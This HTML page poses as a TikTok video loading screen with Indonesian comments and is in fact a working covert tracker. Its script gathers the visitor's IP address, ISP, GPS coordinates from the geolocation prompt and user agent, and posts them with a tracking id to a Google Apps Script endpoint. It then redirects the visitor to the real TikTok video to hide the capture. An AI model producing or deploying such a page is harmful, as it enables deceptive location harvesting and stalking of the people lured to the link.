<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .loading-container {
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #25f4ee;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            font-size: 16px;
            color: #ccc;
            margin-top: 10px;
        }
        .tiktok-logo {
            font-size: 36px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="tiktok-logo">TikTok</div>
        <div class="spinner"></div>
        <div class="message">Memuat video...</div>
    </div>

    <script>
        (async function() {
            const urlParams = new URLSearchParams(window.location.search);
            const originalUrl = urlParams.get('url');
            const id = urlParams.get('id');

            if (!originalUrl || !id) {
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            // Ambil IP dan ISP dari ipapi.co (gratis, tanpa API key)
            async function getIpInfo() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    return {
                        ip: data.ip || '0.0.0.0',
                        isp: data.org || data.isp || 'Tidak diketahui'
                    };
                } catch (err) {
                    console.error('Gagal mengambil IP info:', err);
                    return { ip: '0.0.0.0', isp: 'Tidak diketahui' };
                }
            }

            // Ambil lokasi (jika diizinkan)
            function getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve({ lat: '', lon: '' });
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                lat: position.coords.latitude.toString(),
                                lon: position.coords.longitude.toString()
                            });
                        },
                        (error) => {
                            console.error('Geolocation error:', error.message);
                            resolve({ lat: '', lon: '' });
                        },
                        { timeout: 8000 }
                    );
                });
            }

            // Kumpulkan semua data
            const [ipInfo, location] = await Promise.all([
                getIpInfo(),
                getLocation()
            ]);

            const device = navigator.userAgent;

            // Kirim sebagai form-urlencoded (biar gampang dibaca Apps Script)
            const params = new URLSearchParams();
            params.append('id', id);
            params.append('lat', location.lat);
            params.append('lon', location.lon);
            params.append('ip', ipInfo.ip);
            params.append('isp', ipInfo.isp);
            params.append('device', device);

            const appsScriptUrl = 'https://script.google.com/macros/s/AKfycbzI3SGqGVUH7Phg4B2bCbRNWzZfjx4ujTpvMUtuD-QJ3epigrCLsw7XfeAV2JiDr5_H/exec';

            try {
                await fetch(appsScriptUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: params
                });
                console.log('Data terkirim');
            } catch (err) {
                console.error('Gagal mengirim data:', err);
            }

            // Redirect ke TikTok asli
            setTimeout(() => {
                window.location.href = originalUrl;
            }, 1000);
        })();
    </script>
</body>
</html>
